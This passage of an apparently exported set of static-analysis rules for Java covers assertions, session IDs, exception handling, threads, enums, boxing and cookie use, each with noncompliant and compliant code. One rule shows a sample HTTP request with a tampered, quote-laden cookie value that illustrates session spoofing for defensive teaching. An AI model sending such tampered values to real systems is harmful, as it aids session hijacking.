            "remFnBaseEffort": "1d",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S3346",
            "repo": "java",
            "name": "Expressions used in \"assert\" should not produce side effects",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Since <code>assert</code> statements aren't executed by default (they must be enabled with JVM flags) developers should never rely on their\nexecution the evaluation of any logic required for correct program function.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassert myList.remove(myList.get(0));  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nboolean removed = myList.remove(myList.get(0));\nassert removed;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/mjdGBQ\">CERT, EXP06-J.</a> - Expressions used in assertions must not produce side effects </li>\n</ul>",
            "mdDesc": "<p>Since <code>assert</code> statements aren't executed by default (they must be enabled with JVM flags) developers should never rely on their\nexecution the evaluation of any logic required for correct program function.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassert myList.remove(myList.get(0));  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nboolean removed = myList.remove(myList.get(0));\nassert removed;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/mjdGBQ\">CERT, EXP06-J.</a> - Expressions used in assertions must not produce side effects </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2254",
            "repo": "java",
            "name": "\"HttpServletRequest.getRequestedSessionId()\" should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the Oracle Java API, the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>\n<blockquote>\n  <p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client\n  did not specify a session ID, this method returns null.</p>\n</blockquote>\n<p>The session ID it returns is either transmitted in a cookie or a URL parameter so by definition, nothing prevents the end-user from manually\nupdating the value of this session ID in the HTTP request. </p>\n<p>Here is an example of a updated HTTP header:</p>\n<pre>\nGET /pageSomeWhere HTTP/1.1\nHost: webSite.com\nUser-Agent: Mozilla/5.0\nCookie: JSESSIONID=Hacked_Session_Value'''\"&gt;\n</pre>\n<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (E.G.\nTomcat or Jetty) to see if the value matches the ID of an an existing session. If it does not, the user should be considered unauthenticated.\nMoreover, this session ID should never be logged as is but using a one-way hash to prevent hijacking of active sessions.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(isActiveSession(request.getRequestedSessionId()) ){\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/807\">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "mdDesc": "<p>According to the Oracle Java API, the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>\n<blockquote>\n  <p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client\n  did not specify a session ID, this method returns null.</p>\n</blockquote>\n<p>The session ID it returns is either transmitted in a cookie or a URL parameter so by definition, nothing prevents the end-user from manually\nupdating the value of this session ID in the HTTP request. </p>\n<p>Here is an example of a updated HTTP header:</p>\n<pre>\nGET /pageSomeWhere HTTP/1.1\nHost: webSite.com\nUser-Agent: Mozilla/5.0\nCookie: JSESSIONID=Hacked_Session_Value'''\"&gt;\n</pre>\n<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (E.G.\nTomcat or Jetty) to see if the value matches the ID of an an existing session. If it does not, the user should be considered unauthenticated.\nMoreover, this session ID should never be logged as is but using a one-way hash to prevent hijacking of active sessions.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(isActiveSession(request.getRequestedSessionId()) ){\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/807\">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a2",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1166",
            "repo": "java",
            "name": "Exception handlers should preserve the original exceptions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When handling a caught exception, the original exception's message and stack trace should be logged or passed forward.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {   // Noncompliant - exception is lost\n  LOGGER.info(\"context\");\n}\n\ntry {\n  /* ... */\n} catch (Exception e) {  // Noncompliant - exception is lost (only message is preserved)\n  LOGGER.info(e.getMessage());\n}\n\ntry {\n  /* ... */\n} catch (Exception e) {  // Noncompliant - original exception is lost\n  throw new RuntimeException(\"context\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {\n  LOGGER.info(e);  // exception is logged\n}\n\ntry {\n  /* ... */\n} catch (Exception e) {\n  throw new RuntimeException(e);   // exception stack trace is propagated\n}\n\ntry {\n  /* ... */\n} catch (RuntimeException e) {\n  doSomething();\n  throw e;  // original exception passed forward\n} catch (Exception e) {\n  throw new RuntimeException(e);  // Conversion into unchecked exception is also allowed\n}\n</pre>\n<h2>Exceptions</h2>\n<p><code>InterruptedException</code>, <code>NumberFormatException</code>, <code>DateTimeParseException</code>, <code>ParseException</code> and\n<code>MalformedURLException</code> exceptions are arguably used to indicate nonexceptional outcomes. Similarly, handling\n<code>NoSuchMethodException</code> is often required when dealing with the Java reflection API.</p>\n<p>Because they are part of Java, developers have no choice but to deal with them. This rule does not verify that those particular exceptions are\ncorrectly handled.</p>\n<pre>\nint myInteger;\ntry {\n  myInteger = Integer.parseInt(myString);\n} catch (NumberFormatException e) {\n  // It is perfectly acceptable to not handle \"e\" here\n  myInteger = 0;\n}\n</pre>\n<p>Furthermore, no issue will be raised if the exception message is logged with additional information, as it shows that the developer added some\ncontext to the error message.</p>\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {\n  String message = \"Exception raised while authenticating user: \" + e.getMessage();\n  LOGGER.warn(message); // Compliant - exception message logged with some contextual information\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">OWASP Top 10 2017 Category A10</a> -\n  Insufficient Logging &amp; Monitoring </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/xDdGBQ\">CERT, ERR00-J.</a> - Do not suppress or ignore checked exceptions </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/778.html\">MITRE, CWE-778</a> - Insufficient Logging </li>\n</ul>",
            "mdDesc": "<p>When handling a caught exception, the original exception's message and stack trace should be logged or passed forward.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {   // Noncompliant - exception is lost\n  LOGGER.info(\"context\");\n}\n\ntry {\n  /* ... */\n} catch (Exception e) {  // Noncompliant - exception is lost (only message is preserved)\n  LOGGER.info(e.getMessage());\n}\n\ntry {\n  /* ... */\n} catch (Exception e) {  // Noncompliant - original exception is lost\n  throw new RuntimeException(\"context\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {\n  LOGGER.info(e);  // exception is logged\n}\n\ntry {\n  /* ... */\n} catch (Exception e) {\n  throw new RuntimeException(e);   // exception stack trace is propagated\n}\n\ntry {\n  /* ... */\n} catch (RuntimeException e) {\n  doSomething();\n  throw e;  // original exception passed forward\n} catch (Exception e) {\n  throw new RuntimeException(e);  // Conversion into unchecked exception is also allowed\n}\n</pre>\n<h2>Exceptions</h2>\n<p><code>InterruptedException</code>, <code>NumberFormatException</code>, <code>DateTimeParseException</code>, <code>ParseException</code> and\n<code>MalformedURLException</code> exceptions are arguably used to indicate nonexceptional outcomes. Similarly, handling\n<code>NoSuchMethodException</code> is often required when dealing with the Java reflection API.</p>\n<p>Because they are part of Java, developers have no choice but to deal with them. This rule does not verify that those particular exceptions are\ncorrectly handled.</p>\n<pre>\nint myInteger;\ntry {\n  myInteger = Integer.parseInt(myString);\n} catch (NumberFormatException e) {\n  // It is perfectly acceptable to not handle \"e\" here\n  myInteger = 0;\n}\n</pre>\n<p>Furthermore, no issue will be raised if the exception message is logged with additional information, as it shows that the developer added some\ncontext to the error message.</p>\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {\n  String message = \"Exception raised while authenticating user: \" + e.getMessage();\n  LOGGER.warn(message); // Compliant - exception message logged with some contextual information\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">OWASP Top 10 2017 Category A10</a> -\n  Insufficient Logging &amp; Monitoring </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/xDdGBQ\">CERT, ERR00-J.</a> - Do not suppress or ignore checked exceptions </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/778.html\">MITRE, CWE-778</a> - Insufficient Logging </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "error-handling",
                "owasp-a10",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "exceptions",
                    "htmlDesc": "List of exceptions which should not be checked. Use a simple dash ('-') character to check all exceptions.",
                    "defaultValue": "java.lang.InterruptedException, java.lang.NumberFormatException, java.lang.NoSuchMethodException, java.text.ParseException, java.net.MalformedURLException, java.time.format.DateTimeParseException",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2134",
            "repo": "java",
            "name": "Classes extending java.lang.Thread should override the \"run\" method",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the Java API documentation:</p>\n<blockquote>\n  <p>There are two ways to create a new thread of execution. One is to declare a class to be a subclass of Thread. This subclass should override the\n  run method of class Thread. An instance of the subclass can then be allocated and started...</p>\n  <p>The other way to create a thread is to declare a class that implements the Runnable interface. That class then implements the run method. An\n  instance of the class can then be allocated, passed as an argument when creating Thread, and started.</p>\n</blockquote>\n<p>By definition, extending the Thread class without overriding the <code>run</code> method doesn't make sense, and implies that the contract of the\n<code>Thread</code> class is not well understood.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyRunner extends Thread { // Noncompliant; run method not overridden\n\n  public void doSometing() {...}\n}\n</pre>\n<h2>Exceptions</h2>\n<p>If <code>run()</code> is not overridden in a class extending <code>Thread</code>, it means that starting the thread will actually call\n<code>Thread.run()</code>. However, <code>Thread.run()</code> does nothing if it has not been fed with a target <code>Runnable</code>. The rule\nconsequently ignore classes extending <code>Thread</code> if they are calling, in their constructors, the <code>super(...)</code> constructor with a\nproper <code>Runnable</code> target.</p>\n<pre>\nclass MyThread extends Thread { // Compliant - calling super constructor with a Runnable\n  MyThread(Runnable target) {\n    super(target); // calling super constructor with a Runnable, which will be used for when Thread.run() is executed\n    // ...\n  }\n}\n</pre>",
            "mdDesc": "<p>According to the Java API documentation:</p>\n<blockquote>\n  <p>There are two ways to create a new thread of execution. One is to declare a class to be a subclass of Thread. This subclass should override the\n  run method of class Thread. An instance of the subclass can then be allocated and started...</p>\n  <p>The other way to create a thread is to declare a class that implements the Runnable interface. That class then implements the run method. An\n  instance of the class can then be allocated, passed as an argument when creating Thread, and started.</p>\n</blockquote>\n<p>By definition, extending the Thread class without overriding the <code>run</code> method doesn't make sense, and implies that the contract of the\n<code>Thread</code> class is not well understood.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyRunner extends Thread { // Noncompliant; run method not overridden\n\n  public void doSometing() {...}\n}\n</pre>\n<h2>Exceptions</h2>\n<p>If <code>run()</code> is not overridden in a class extending <code>Thread</code>, it means that starting the thread will actually call\n<code>Thread.run()</code>. However, <code>Thread.run()</code> does nothing if it has not been fed with a target <code>Runnable</code>. The rule\nconsequently ignore classes extending <code>Thread</code> if they are calling, in their constructors, the <code>super(...)</code> constructor with a\nproper <code>Runnable</code> target.</p>\n<pre>\nclass MyThread extends Thread { // Compliant - calling super constructor with a Runnable\n  MyThread(Runnable target) {\n    super(target); // calling super constructor with a Runnable, which will be used for when Thread.run() is executed\n    // ...\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "multi-threading",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1165",
            "repo": "java",
            "name": "Exception classes should be immutable",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Exceptions are meant to represent the application's state at the point at which an error occurred.</p>\n<p>Making all fields in an <code>Exception</code> class <code>final</code> ensures that this state:</p>\n<ul>\n  <li> Will be fully defined at the same time the <code>Exception</code> is instantiated. </li>\n  <li> Won't be updated or corrupted by a questionable error handler. </li>\n</ul>\n<p>This will enable developers to quickly understand what went wrong.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyException extends Exception {\n\n  private int status;                               // Noncompliant\n\n  public MyException(String message) {\n    super(message);\n  }\n\n  public int getStatus() {\n    return status;\n  }\n\n  public void setStatus(int status) {\n    this.status = status;\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyException extends Exception {\n\n  private final int status;\n\n  public MyException(String message, int status) {\n    super(message);\n    this.status = status;\n  }\n\n  public int getStatus() {\n    return status;\n  }\n\n}\n</pre>",
            "mdDesc": "<p>Exceptions are meant to represent the application's state at the point at which an error occurred.</p>\n<p>Making all fields in an <code>Exception</code> class <code>final</code> ensures that this state:</p>\n<ul>\n  <li> Will be fully defined at the same time the <code>Exception</code> is instantiated. </li>\n  <li> Won't be updated or corrupted by a questionable error handler. </li>\n</ul>\n<p>This will enable developers to quickly understand what went wrong.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyException extends Exception {\n\n  private int status;                               // Noncompliant\n\n  public MyException(String message) {\n    super(message);\n  }\n\n  public int getStatus() {\n    return status;\n  }\n\n  public void setStatus(int status) {\n    this.status = status;\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyException extends Exception {\n\n  private final int status;\n\n  public MyException(String message, int status) {\n    super(message);\n    this.status = status;\n  }\n\n  public int getStatus() {\n    return status;\n  }\n\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4551",
            "repo": "java",
            "name": "Enum values should be compared with \"==\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Testing equality of an enum value with <code>equals</code> is perfectly valid because an enum is an Object and every Java developer knows \"==\"\nshould not be used to compare the content of an Object. At the same time, using \"==\" on enums:</p>\n<p>- provides the same expected comparison (content) as <code>equals</code></p>\n<p>- is more null-safe than equals()</p>\n<p>- provides compile-time (static) checking rather than runtime checking</p>\n<p>For these reasons, use of \"==\" should be preferred to <code>equals</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic enum Fruit {\n   APPLE, BANANA, GRAPE\n}\n\npublic enum Cake {\n  LEMON_TART, CHEESE_CAKE\n}\n\npublic boolean isFruitGrape(Fruit candidateFruit) {\n  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; this will raise an NPE if candidateFruit is NULL\n}\n\npublic boolean isFruitGrape(Cake candidateFruit) {\n  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; always returns false\n}\n\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean isFruitGrape(Fruit candidateFruit) {\n  return candidateFruit == Fruit.GRAPE; // Compliant; there is only one instance of Fruit.GRAPE - if candidateFruit is a GRAPE it will have the same reference as Fruit.GRAPE\n}\n\npublic boolean isFruitGrape(Cake candidateFruit) {\n  return candidateFruit == Fruit.GRAPE; // Compliant; compilation time failure\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.javaworld.com/article/2074292/core-java/use-----or-----to-compare-java-enums.html\">Use == (or !=) to Compare Java\n  Enums</a> </li>\n</ul>",
            "mdDesc": "<p>Testing equality of an enum value with <code>equals</code> is perfectly valid because an enum is an Object and every Java developer knows \"==\"\nshould not be used to compare the content of an Object. At the same time, using \"==\" on enums:</p>\n<p>- provides the same expected comparison (content) as <code>equals</code></p>\n<p>- is more null-safe than equals()</p>\n<p>- provides compile-time (static) checking rather than runtime checking</p>\n<p>For these reasons, use of \"==\" should be preferred to <code>equals</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic enum Fruit {\n   APPLE, BANANA, GRAPE\n}\n\npublic enum Cake {\n  LEMON_TART, CHEESE_CAKE\n}\n\npublic boolean isFruitGrape(Fruit candidateFruit) {\n  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; this will raise an NPE if candidateFruit is NULL\n}\n\npublic boolean isFruitGrape(Cake candidateFruit) {\n  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; always returns false\n}\n\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean isFruitGrape(Fruit candidateFruit) {\n  return candidateFruit == Fruit.GRAPE; // Compliant; there is only one instance of Fruit.GRAPE - if candidateFruit is a GRAPE it will have the same reference as Fruit.GRAPE\n}\n\npublic boolean isFruitGrape(Cake candidateFruit) {\n  return candidateFruit == Fruit.GRAPE; // Compliant; compilation time failure\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.javaworld.com/article/2074292/core-java/use-----or-----to-compare-java-enums.html\">Use == (or !=) to Compare Java\n  Enums</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2131",
            "repo": "java",
            "name": "Primitives should not be boxed just for \"String\" conversion",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>\"Boxing\" is the process of putting a primitive value into a primitive-wrapper object. When that's done purely to use the wrapper class'\n<code>toString</code> method, it's a waste of memory and cycles because those methods are <code>static</code>, and can therefore be used without a\nclass instance. Similarly, using the <code>static</code> method <code>valueOf</code> in the primitive-wrapper classes with a non-<code>String</code>\nargument should be avoided.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint myInt = 4;\nString myIntString = (new Integer(myInt)).toString(); // Noncompliant; creates &amp; discards an Integer object\nmyIntString = Integer.valueOf(myInt).toString(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint myInt = 4;\nString myIntString = Integer.toString(myInt);\n</pre>",
            "mdDesc": "<p>\"Boxing\" is the process of putting a primitive value into a primitive-wrapper object. When that's done purely to use the wrapper class'\n<code>toString</code> method, it's a waste of memory and cycles because those methods are <code>static</code>, and can therefore be used without a\nclass instance. Similarly, using the <code>static</code> method <code>valueOf</code> in the primitive-wrapper classes with a non-<code>String</code>\nargument should be avoided.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint myInt = 4;\nString myIntString = (new Integer(myInt)).toString(); // Noncompliant; creates &amp; discards an Integer object\nmyIntString = Integer.valueOf(myInt).toString(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint myInt = 4;\nString myIntString = Integer.toString(myInt);\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2255",
            "repo": "java",
            "name": "Writing cookies is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11639\">CVE-2018-11639</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537\">CVE-2016-6537</a> </li>\n</ul>\n<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>\n<p>This rule flags code that writes cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sensitive information is stored inside the cookie. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the\nuser session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer\nthan the user session.</p>\n<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the\noriginal information will be exposed.</p>\n<p>Using cookies only for session IDs doesn't make them secure. Follow <a\nhref=\"https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies\">OWASP best practices</a> when you configure your cookies.</p>\n<p>As a side note, every information read from a cookie should be <a\nhref=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitized</a>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === javax.servlet ===\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpServletRequest;\n\npublic class JavaxServlet {\n    void aServiceMethodSettingCookie(HttpServletRequest request, HttpServletResponse response, String acctID) {\n        Cookie cookie = new Cookie(\"userAccountID\", acctID);  // Sensitive\n        response.addCookie(cookie);  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === javax.ws ===\nimport java.util.Date;\nimport javax.ws.rs.core.Cookie;\nimport javax.ws.rs.core.NewCookie;\n\nclass JavaxWs {\n    void jaxRsCookie(String comment, int maxAge, boolean secure, Date expiry, boolean httpOnly, String name,\n            String value, String path, String domain, int version) {\n        Cookie cookie= new Cookie(\"name\", \"value\");  // Sensitive\n\n        new NewCookie(cookie);  // Sensitive\n        new NewCookie(cookie, comment, maxAge, secure);  // Sensitive\n        new NewCookie(cookie, comment, maxAge, expiry, secure, httpOnly);  // Sensitive\n        new NewCookie(name, value);  // Sensitive\n        new NewCookie(name, value, path, domain, version, comment, maxAge, secure);  // Sensitive\n        new NewCookie(name, value, path, domain, version, comment, maxAge, expiry, secure, httpOnly);  // Sensitive\n        new NewCookie(name, value, path, domain, comment, maxAge, secure);  // Sensitive\n        new NewCookie(name, value, path, domain, comment, maxAge, secure, httpOnly);  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === java.net ===\nimport java.net.HttpCookie;\n\nclass JavaNet {\n    void httpCookie(HttpCookie hc) {\n        HttpCookie cookie = new HttpCookie(\"name\", \"value\");  // Sensitive\n        cookie.setValue(\"value\");  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === apache.shiro ===\nimport org.apache.shiro.web.servlet.SimpleCookie;\n\nclass ApacheShiro {\n\n    void shiroCookie(SimpleCookie cookie) {\n        SimpleCookie sc = new SimpleCookie(cookie);  // Sensitive\n        cookie.setValue(\"value\");  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === Play ===\nimport play.mvc.Http.Cookie;\nimport play.mvc.Http.CookieBuilder;\n\n\nclass Play {\n    void playCookie() {\n        CookieBuilder builder = Cookie.builder(\"name\", \"value\");  // Sensitive\n        builder.withName(\"name\")\n          .withValue(\"value\")  // Sensitive\n          .build();\n\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/312.html\">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/315.html\">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side\">CERT,\n  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE\">COOKIE_USAGE</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11639\">CVE-2018-11639</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537\">CVE-2016-6537</a> </li>\n</ul>\n<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>\n<p>This rule flags code that writes cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sensitive information is stored inside the cookie. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the\nuser session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer\nthan the user session.</p>\n<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the\noriginal information will be exposed.</p>\n<p>Using 